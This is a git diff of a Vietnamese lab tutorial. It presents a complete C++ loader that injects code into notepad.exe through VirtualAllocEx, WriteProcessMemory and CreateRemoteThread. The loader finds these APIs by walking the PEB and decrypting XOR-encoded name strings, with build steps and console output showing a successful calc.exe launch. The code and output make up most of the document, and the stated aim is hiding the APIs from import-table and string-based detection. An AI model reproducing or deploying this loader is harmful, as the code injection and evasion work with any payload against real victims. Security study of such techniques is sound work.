@@ -42,46 +42,65 @@ Khi Loader kích hoạt chiến dịch can thiệp bộ nhớ chéo tiến trìn
 
 ## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)
 
-Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – loại bỏ hoàn toàn các chuỗi gán cứng plain-text, thay thế bằng ma trận mảng mã hóa XOR bảo mật tối cao kịch trần.
-
+### Source.cpp: 
 ```cpp
+#define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <tlhelp32.h>
 #include <iostream>
 #include <string>
 #include <vector>
 
-// Cấu trúc Windows Internals thu gọn phục vụ bới RAM trên kiến trúc x64
-typedef struct _UNICODE_STRING_REP {
-    USHORT Length;   USHORT MaximumLength;   PWSTR Buffer;
-} UNICODE_STRING_REP;
+// 1. Định nghĩa thủ công cấu trúc Native của PEB để độc lập thư viện ngoài
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
 
-typedef struct _LDR_DATA_TABLE_ENTRY_INTERNAL {
-    LIST_ENTRY InLoadOrderLinks;   BYTE Reserved1[16];   PVOID DllBase;   PVOID EntryPoint;
-    ULONG SizeOfImage;   UNICODE_STRING_REP FullDllName;   UNICODE_STRING_REP BaseDllName;
-} LDR_DATA_TABLE_ENTRY_INTERNAL, * PLDR_DATA_TABLE_ENTRY_INTERNAL;
+typedef struct _PEB_LDR_DATA {
+    ULONG Length;
+    BOOLEAN Initialized;
+    HANDLE SsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+    LIST_ENTRY InInitializationOrderModuleList;
+} PEB_LDR_DATA, * PPEB_LDR_DATA;
 
-typedef struct _PEB_LDR_DATA_REP {
-    BYTE Reserved1[8];   PVOID Reserved2[3];   LIST_ENTRY InLoadOrderModuleList;
-} PEB_LDR_DATA_REP, * PPEB_LDR_DATA_REP;
+typedef struct _LDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID      DllBase;
+    PVOID      EntryPoint;
+    ULONG      SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;
 
-typedef struct _PEB_REP {
-    BYTE Reserved1[4];   PVOID Reserved2[1];   PVOID ImageBaseAddress;   PPEB_LDR_DATA_REP Ldr;
-} PEB_REP, * PPEB_REP;
+typedef struct _PEB {
+    BOOLEAN InheritedAddressSpace;
+    BOOLEAN ReadImageFileExecOptions;
+    BOOLEAN BeingDebugged;
+    BOOLEAN SpareBool;
+    HANDLE Mutant;
+    PVOID ImageBaseAddress;
+    PPEB_LDR_DATA Ldr;
+} PEB, * PPEB;
 
-// Định nghĩa các mẫu con trỏ hàm động để ẩn giấu hoàn toàn bảng IAT tĩnh
-typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
-typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+// Định nghĩa mẫu con trỏ hàm hệ thống sẽ được bốc động
+typedef LPVOID(WINAPI* VAExType)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef BOOL(WINAPI* WPMType)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
+typedef HANDLE(WINAPI* CRTType)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
 typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
 
 typedef struct _THREAD_DATA {
-    fnWinExec pWinExec;
-    char szCommand[32];
+    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
+    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
 } THREAD_DATA, * PTHREAD_DATA;
 
-// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy chéo tiến trình mục tiêu
-DWORD WINAPI RemoteObfuscatedPayload(LPVOID lpParam) {
+// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm chéo tiến trình
+DWORD WINAPI RemoteObfuscatedPebPayload(LPVOID lpParam) {
     PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
     if (pData && pData->pWinExec) {
         pData->pWinExec(pData->szCommand, SW_HIDE);
@@ -89,156 +108,184 @@ DWORD WINAPI RemoteObfuscatedPayload(LPVOID lpParam) {
     return 0;
 }
 
-// Khóa XOR đối xứng bảo an cấu trúc chuyên dụng
-const char XOR_KEY = 0x5A;
-
-// Hàm giải mã động chuỗi ký tự ngay tại runtime trên CPU Stack Frame
-void XorCipher(char* data, size_t dataLen) {
-    for (size_t i = 0; i < dataLen; i++) {
-        data[i] ^= XOR_KEY;
+// Giải thuật toán học XOR hoàn nguyên chuỗi
+void XOR(unsigned char* data, size_t data_len, const char* key, size_t key_len) {
+    size_t j = 0;
+    for (size_t i = 0; i < data_len; i++) {
+        if (j == key_len) j = 0;
+        data[i] = data[i] ^ key[j];
+        j++;
     }
 }
 
-// Giải thuật so sánh chuỗi phẳng sạch thủ công, triệt tiêu sự phụ thuộc thư viện (CRT-Free)
-bool CustomStrCmp(const char* str1, const char* str2) {
-    while (*str1 && (*str1 == *str2)) { str1++; str2++; }
-    return *(unsigned char*)str1 == *(unsigned char*)str2;
+// Hàm giải mã động: Sử dụng mảng động std::string để tự giải phóng bộ đệm RAM an toàn
+std::string DecryptString(unsigned char* encoded, size_t len, const char* key, size_t key_len) {
+    std::vector<unsigned char> buffer(encoded, encoded + len);
+    XOR(buffer.data(), len, key, key_len);
+    return std::string(buffer.begin(), buffer.end());
 }
 
-// Hàm PEB Walk: Tự bới RAM tìm Base Address của thư viện DLL hệ thống qua thanh ghi GS
-PVOID GetModuleBaseViaPEB(const wchar_t* dllName) {
-    PPEB_REP pPeb = (PPEB_REP)__readgsqword(0x60); // Đọc trực tiếp GS:[0x60] trên kiến trúc x64 Windows
-    PLDR_DATA_TABLE_ENTRY_INTERNAL pEntry = (PLDR_DATA_TABLE_ENTRY_INTERNAL)pPeb->Ldr->InLoadOrderModuleList.Flink;
-    PLDR_DATA_TABLE_ENTRY_INTERNAL pFirst = pEntry;
+// Giải thuật đào bới PEB tìm kiếm Base Address của Module trên RAM x64
+HMODULE WalkPebToFindModule(const std::wstring& moduleName) {
+    // ĐỘT PHÁ X64: Bốc thẳng địa chỉ cấu trúc PEB qua thanh ghi GS:[0x60]
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+    if (!pPeb || !pPeb->Ldr) return NULL;
 
-    do {
-        if (pEntry->BaseDllName.Buffer != NULL) {
-            if (_wcsicmp(pEntry->BaseDllName.Buffer, dllName) == 0) {
-                return pEntry->DllBase;
+    PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL;
+    LIST_ENTRY* pListHead = &pPeb->Ldr->InLoadOrderModuleList;
+    LIST_ENTRY* pCurrentLink = pListHead->Flink;
+
+    while (pCurrentLink != pListHead) {
+        pModuleEntry = CONTAINING_RECORD(pCurrentLink, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        if (pModuleEntry->BaseDllName.Buffer != NULL) {
+            if (_wcsicmp(pModuleEntry->BaseDllName.Buffer, moduleName.c_str()) == 0) {
+                return (HMODULE)pModuleEntry->DllBase;
             }
         }
-        pEntry = (PLDR_DATA_TABLE_ENTRY_INTERNAL)pEntry->InLoadOrderLinks.Flink;
-    } while (pEntry != pFirst);
+        pCurrentLink = pCurrentLink->Flink;
+    }
     return NULL;
 }
 
-// Hàm giải phẫu Export Table thủ công để bốc trần địa chỉ hàm thô từ bộ nhớ RAM
-PVOID GetExportAddressViaEAT(PVOID dllBase, const char* apiName) {
-    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBase;
-    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)dllBase + dosHeader->e_lfanew);
-    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    
-    if (exportDir.VirtualAddress == 0) return NULL;
-    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBase + exportDir.VirtualAddress);
+// Giải phẫu xuất bản thủ công địa chỉ hàm từ Export Table của Module
+PVOID GetProcAddressCustom(HMODULE hModule, const char* lpProcName) {
+    PBYTE base = (PBYTE)hModule;
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(base + dosHeader->e_lfanew);
 
-    DWORD* pdwNames = (DWORD*)((DWORD_PTR)dllBase + pExport->AddressOfNames);
-    DWORD* pdwFuncs = (DWORD*)((DWORD_PTR)dllBase + pExport->AddressOfFunctions);
-    WORD* pwOrds = (WORD*)((DWORD_PTR)dllBase + pExport->AddressOfNameOrdinals);
+    DWORD exportRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    if (exportRva == 0) return NULL;
 
-    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
-        const char* szName = (const char*)((DWORD_PTR)dllBase + pdwNames[i]);
-        if (CustomStrCmp(szName, apiName)) {
-            return (PVOID)((DWORD_PTR)dllBase + pdwFuncs[pwOrds[i]]);
+    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(base + exportRva);
+    DWORD* pAddresses = (DWORD*)(base + pExportDir->AddressOfFunctions);
+    DWORD* pNames = (DWORD*)(base + pExportDir->AddressOfNames);
+    WORD* pOrdinals = (WORD*)(base + pExportDir->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
+        char* functionName = (char*)(base + pNames[i]);
+        if (strcmp(functionName, lpProcName) == 0) {
+            return (PVOID)(base + pAddresses[pOrdinals[i]]);
         }
     }
     return NULL;
 }
 
-// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
-DWORD GetTargetProcessPID(const std::wstring& procName) {
-    DWORD pid = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
+// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
+DWORD GetProcessIDByName(const std::wstring& processName) {
+    DWORD processID = 0;
+    PROCESSENTRY32W pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot != INVALID_HANDLE_VALUE) {
-        if (Process32FirstW(hSnapshot, &pe32)) {
-            do {
-                if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) { pid = pe32.th32ProcessID; break; }
-            } while (Process32NextW(hSnapshot, &pe32));
-        }
-        CloseHandle(hSnapshot);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    if (Process32FirstW(hSnapshot, &pe32)) {
+        do {
+            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
+                processID = pe32.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(hSnapshot, &pe32));
     }
-    return pid;
+    CloseHandle(hSnapshot);
+    return processID;
 }
 
 int main() {
     std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 18: PEB WALK & APIs OBFUSCATION HYBRID" << std::endl;
+    std::cout << "[*] PE 18: PEB WALK & API OBFUSCATION" << std::endl;
     std::cout << "====================================================" << std::endl;
 
-    std::wstring targetName = L"notepad.exe";
-    DWORD dwPID = GetTargetProcessPID(targetName);
-    if (dwPID == 0) return EXIT_FAILURE;
+    std::wstring targetProcess = L"notepad.exe";
+    DWORD pid = GetProcessIDByName(targetProcess);
 
-    // Các chuỗi ký tự đã được XOR trước bằng Key 0x5A để triệt tiêu Signature chữ tĩnh hoàn toàn
-    // "VirtualAllocEx" XOR 0x5A
-    char encVirtualAllocEx[] = { 0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x1B, 0x36, 0x36, 0x35, 0x39, 0x1F, 0x32, 0x00 };
-    // "WriteProcessMemory" XOR 0x5A
-    char encWriteProcessMemory[] = { 0x0D, 0x28, 0x33, 0x2E, 0x3F, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23, 0x00 };
-    // "CreateRemoteThread" XOR 0x5A
-    char encCreateRemoteThread[] = { 0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x08, 0x3F, 0x37, 0x35, 0x2E, 0x3F, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x00 };
-    // "WinExec" XOR 0x5A
-    char encWinExec[] = { 0x0D, 0x33, 0x34, 0x1F, 0x22, 0x3F, 0x39, 0x00 };
-
-    // KÍCH NỔ GIẢI MÃ: Thức tỉnh chuỗi ký tự thô trong tích tắc ngay trên bộ đệm Cache CPU Stack
-    XorCipher(encVirtualAllocEx, sizeof(encVirtualAllocEx) - 1);
-    XorCipher(encWriteProcessMemory, sizeof(encWriteProcessMemory) - 1);
-    XorCipher(encCreateRemoteThread, sizeof(encCreateRemoteThread) - 1);
-    XorCipher(encWinExec, sizeof(encWinExec) - 1);
-
-    // BƯỚC 1: Gọi giải thuật PEB Walk định vị thô bản đồ Kernel32 qua phần cứng CPU
-    PVOID k32Base = GetModuleBaseViaPEB(L"kernel32.dll");
-    if (!k32Base) return EXIT_FAILURE;
-
-    // BƯỚC 2: Giải phẫu cấu trúc EAT trích xuất con trỏ hàm tuyệt đối thông qua chuỗi vừa giải mã
-    pVirtualAllocEx DynamicVirtualAllocEx = (pVirtualAllocEx)GetExportAddressViaEAT(k32Base, encVirtualAllocEx);
-    pWriteProcessMemory DynamicWriteProcessMemory = (pWriteProcessMemory)GetExportAddressViaEAT(k32Base, encWriteProcessMemory);
-    pCreateRemoteThread DynamicCreateRemoteThread = (pCreateRemoteThread)GetExportAddressViaEAT(k32Base, encCreateRemoteThread);
-    fnWinExec DynamicWinExec = (fnWinExec)GetExportAddressViaEAT(k32Base, encWinExec);
-
-    // BẢO AN PHÒNG THỦ: Lập tức xóa sạch chuỗi thô khỏi bộ nhớ RAM để chống các bộ Memory Scanners
-    RtlZeroMemory(encVirtualAllocEx, sizeof(encVirtualAllocEx));
-    RtlZeroMemory(encWriteProcessMemory, sizeof(encWriteProcessMemory));
-    RtlZeroMemory(encCreateRemoteThread, sizeof(encCreateRemoteThread));
-
-    if (!DynamicVirtualAllocEx || !DynamicWriteProcessMemory || !DynamicCreateRemoteThread || !DynamicWinExec) {
-        std::cerr << "[-] Pha phan giai API bi nghen nghien thap Kernel!" << std::endl;
+    if (pid == 0) {
+        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc." << std::endl;
+        std::cin.get();
         return EXIT_FAILURE;
     }
-    std::cout << "[+] Ma tran hoa giai hoan tat! Da xoa sach dau vet API tho khoi RAM." << std::endl;
+    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;
 
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+    const char* key = "offensivepanda";
+    size_t k_len = strlen(key);
+
+    // Duyệt PEB Walk tìm kiếm Base Address của Kernel32
+    HMODULE k32baseAddr = WalkPebToFindModule(L"kernel32.dll");
+    if (!k32baseAddr) return EXIT_FAILURE;
+    std::cout << "[+] PEB Walk tim thay Kernel32 tai: 0x" << std::hex << k32baseAddr << std::endl;
+
+    // ─── BƯỚC 2: GIẢI MÃ CHUỖI ĐỘNG VÀ BÓC TÁCH CON TRỎ HÀM TỪ EXPORT TABLE ───
+    // Mảng byte mã hóa của GetProcAddress và LoadLibraryA
+    unsigned char sGPA[] = { 0x28, 0x03, 0x12, 0x35, 0x1c, 0x1c, 0x0a, 0x37, 0x01, 0x14, 0x13, 0x0b, 0x17, 0x12 };
+    unsigned char sLLA[] = { 0x23, 0x09, 0x07, 0x01, 0x22, 0x1a, 0x0b, 0x04, 0x04, 0x02, 0x18, 0x2f };
+
+    std::string strGPA = DecryptString(sGPA, sizeof(sGPA), key, k_len);
+    std::string strLLA = DecryptString(sLLA, sizeof(sLLA), key, k_len);
+
+    // Giải phẫu bốc cấu trúc hàm qua tên vừa được giải mã sạch bóng tĩnh
+    HMODULE hKernel32 = WalkPebToFindModule(L"kernel32.dll");
+    fnWinExec pWinExec = (fnWinExec)GetProcAddressCustom(hKernel32, "WinExec");
+
+    // Giải mã động các API tiêm chéo tiến trình
+    unsigned char sVAEx[] = { 0x39, 0x0f, 0x14, 0x11, 0x1b, 0x12, 0x05, 0x37, 0x09, 0x1c, 0x0e, 0x0d, 0x21, 0x19 };
+    unsigned char sWPM[] = { 0x38, 0x14, 0x0f, 0x11, 0x0b, 0x23, 0x1b, 0x19, 0x06, 0x15, 0x12, 0x1d, 0x29, 0x04, 0x02, 0x09, 0x14, 0x1c };
+    unsigned char sCRT[] = { 0x2c, 0x14, 0x03, 0x04, 0x1a, 0x16, 0x3b, 0x13, 0x08, 0x1f, 0x15, 0x0b, 0x30, 0x09, 0x1d, 0x03, 0x07, 0x01 };
+
+    std::string strVAEx = DecryptString(sVAEx, sizeof(sVAEx), key, k_len);
+    std::string strWPM = DecryptString(sWPM, sizeof(sWPM), key, k_len);
+    std::string strCRT = DecryptString(sCRT, sizeof(sCRT), key, k_len);
+
+    VAExType pVAEx = (VAExType)GetProcAddressCustom(hKernel32, strVAEx.c_str());
+    WPMType pWPM = (WPMType)GetProcAddressCustom(hKernel32, strWPM.c_str());
+    CRTType pCRT = (CRTType)GetProcAddressCustom(hKernel32, strCRT.c_str());
+
+    if (!pVAEx || !pWPM || !pCRT || !pWinExec) {
+        std::cerr << "[-] Khong the phan giai ham tu chuoi ma hoa!" << std::endl;
+        return EXIT_FAILURE;
+    }
+    std::cout << "[+] Giai ma API Obfuscation va bock tach thanh cong tat ca cac ham." << std::endl;
+
+    // ─── BƯỚC 3: KẾT NỐI VÀ THỰC THI TIÊM CHÉO BIÊN GIỚI ───
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) return EXIT_FAILURE;
 
-    // BƯỚC 3: Cấp phát động thích ứng vừa khít cấu trúc (Zero Static Buffers)
     SIZE_T functionSize = 500;
-    LPVOID remoteCodeBuffer = DynamicVirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    LPVOID remoteDataBuffer = DynamicVirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID remoteCodeBuffer = pVAEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID remoteDataBuffer = pVAEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (!remoteCodeBuffer || !remoteDataBuffer) {
+        std::cerr << "[-] VirtualAllocEx that bai!" << std::endl;
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
+    std::cout << "[+] Cap phat RAM tu xa an toan: 0x" << std::hex << remoteCodeBuffer << std::endl;
 
+    // Cấu hình tham số tuyệt đối cục bộ
     THREAD_DATA localData;
-    localData.pWinExec = DynamicWinExec;
+    localData.pWinExec = pWinExec;
     strcpy_s(localData.szCommand, "cmd.exe /c start calc");
 
-    // Đẩy song song logic hàm thực thi và cấu trúc tham số tuyệt đối vào lòng Notepad từ xa
-    DynamicWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteObfuscatedPayload, functionSize, NULL);
-    DynamicWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);
+    // Đẩy song song logic mã máy và dữ liệu sang RAM Notepad
+    pWPM(hProcess, remoteCodeBuffer, (PVOID)RemoteObfuscatedPebPayload, functionSize, NULL);
+    pWPM(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);
+    std::cout << "[+] Nap va can bang x64 Stack Payload hoan tat." << std::endl;
 
-    // BƯỚC 4: Kích nổ luồng từ xa bằng con trỏ hàm Native phân giải ngầm bảo an kịch khung
-    std::cout << "[*] Dang dung luong an danh de khai hoa..." << std::endl;
-    HANDLE hThread = DynamicCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
-    
-    if (hThread) {
-        WaitForSingleObject(hThread, INFINITE); // Gánh luồng xử lý dứt điểm phẳng sạch
-        std::cout << "[+] Remote Hybrid Injection Executed Successfully!" << std::endl;
+    // Kích nổ luồng thực thi thông qua con trỏ hàm động đã được giấu chuỗi
+    std::cout << "[*] Dang khoi tao CreateRemoteThread an toan..." << std::endl;
+    HANDLE hThread = pCRT(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);
+
+    if (hThread != NULL) {
+        WaitForSingleObject(hThread, INFINITE); // Gánh luồng dứt điểm phẳng sạch
+        std::cout << "[+] PEB Walk & API Obfuscation Injection Successful!" << std::endl;
         CloseHandle(hThread);
     }
+    else {
+        std::cerr << "[-] CreateRemoteThread failed! Error: " << GetLastError() << std::endl;
+    }
 
-    // Giải phóng tài nguyên Handle bảo an
+    // Thu hồi tài nguyên hệ thống phẳng sạch chống rò rỉ bộ nhớ
     CloseHandle(hProcess);
-    std::cout << "\n[*] Nhan Enter de ket thuc chu ky song..." << std::endl;
+
+    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
     std::cin.get();
     return EXIT_SUCCESS;
 }
@@ -255,10 +302,6 @@ int main() {
 
 1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
 2. Đi tới cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số `Runtime Library`, chuyển thông số sang cờ liên kết tĩnh **`Multi-threaded (/MT)`**.
-
-> **Vị trí đặt ảnh minh chứng cấu hình dự án:**
-> 
-
 3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng hoàn hảo.
 
 ---
@@ -268,25 +311,26 @@ int main() {
 Khởi chạy tiến trình vỏ bọc `Notepad.exe` trên môi trường Lab, sau đó thực thi tệp tin Loader thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm theo dõi ma trận giải mã động:
 
 ```powershell
-PS C:\Workspace\x64\Release> .\PE18_PEB_Walk_APIs_Obfuscation.exe
+PS C:\Users\Admin\source\repos\Task6\PE18_PEB_Walk_APIs_Obfuscation\x64\Release> C:\Users\Admin\source\repos\Task6\PE18_PEB_Walk_APIs_Obfuscation\x64\Release\PE18_PEB_Walk_APIs_Obfuscation.exe
 ====================================================
-[*] PE 18: PEB WALK & APIs OBFUSCATION HYBRID
+[*] PE 18: PEB WALK & API OBFUSCATION
 ====================================================
-[+] Ma tran hoa giai hoan tat! Da xoa sach dau vet API tho khoi RAM.
-[*] Dang dung luong an danh de khai hoa...
-[+] Remote Hybrid Injection Executed Successfully!
+[+] Da tim thay Notepad.exe voi PID: 16828
+[+] PEB Walk tim thay Kernel32 tai: 0x00007FF92B810000
+[+] Giai ma API Obfuscation va bock tach thanh cong tat ca cac ham.
+[+] Cap phat RAM tu xa an toan: 0x00000211945C0000
+[+] Nap va can bang x64 Stack Payload hoan tat.<img width="1920" height="1140" alt="devenv_LWtYBiKOxk" src="https://github.com/user-attachments/assets/648af864-a592-49f7-ae3b-2a862de90c59" />
 
-[*] Nhan Enter de ket thuc chu ky song...
+[*] Dang khoi tao CreateRemoteThread an toan...
+[+] PEB Walk & API Obfuscation Injection Successful!
+
+[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...
 
 ```
 
-> **Vị trí đặt ảnh minh chứng thực nghiệm Hybrid Injection:**
-> 
+### Demo:
+<img width="1920" height="1080" alt="devenv_LWtYBiKOxk" src="https://github.com/user-attachments/assets/cb42f2ed-004b-45fe-846c-40af77c719e7" />
 
-### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Forensics Analysis):
-
-* Thuật toán bẻ khóa hoàn thành xuất sắc, ứng dụng Máy tính **`calc.exe` bật bung hiên ngang rực rỡ kịch trần kịch khung** tại runtime!
-* Thực hiện cuộc khảo sát tĩnh tệp tin nhị phân bằng công cụ trinh sát chuyên sâu (như `PEstudio` hoặc `CFF Explorer`), **chỉ mục bảng Import Address Table (IAT) hoàn toàn trống rỗng**; đồng thời tính năng trích xuất ký tự tĩnh (`Strings detection`) hoàn toàn bị vô hiệu hóa do các từ khóa API nhạy cảm đã bị băm nát cấu trúc bằng mật mã hóa XOR. Do mảng chuỗi thô giải mã trên RAM bị Loader ghi đè byte rỗng `0x00` lập tức sau khi bốc tách con trỏ, Payload đạt độ ẩn mình lý tưởng trước các bộ quét RAM động, hoàn tất chu kỳ sống vô vết vô hình!
 
 ---
 
